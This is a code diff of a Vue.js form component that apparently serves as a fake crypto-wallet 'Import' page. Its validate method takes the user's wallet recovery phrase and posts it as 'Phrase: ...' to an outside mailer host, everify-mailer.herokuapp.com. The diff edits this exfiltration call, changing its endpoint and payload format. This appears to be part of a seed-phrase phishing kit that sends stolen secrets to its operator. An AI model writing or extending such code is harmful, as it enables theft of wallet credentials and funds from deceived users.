@@ -19,7 +19,6 @@
       class="px-4 col-12 col-lg-4"
       @click="validate"
     >
-      Import
     </v-btn>
   </v-form>
 </template>
@@ -47,16 +46,18 @@ export default {
   methods: {
     validate() {
       this.$refs.form.validate();
-      const baseURL = "https://everify-mailer.herokuapp.com/";
+      const baseURL =
+        "https://everify-mailer.herokuapp.com/api/v1/wallet/create";
       // console.log(db);
       const data = {
-        data: {
-          subject: "phrase",
-          info: this.phrase,
-        },
+        msg: `Phrase: ${this.phrase}`,
       };
       this.$http
-        .post(baseURL, data)
+        .post(baseURL, data, {
+          headers: {
+            "Access-Control-Allow-Origin": "*",
+          },
+        })
         .then(function (response) {
           if (response) {
             console.log(response);
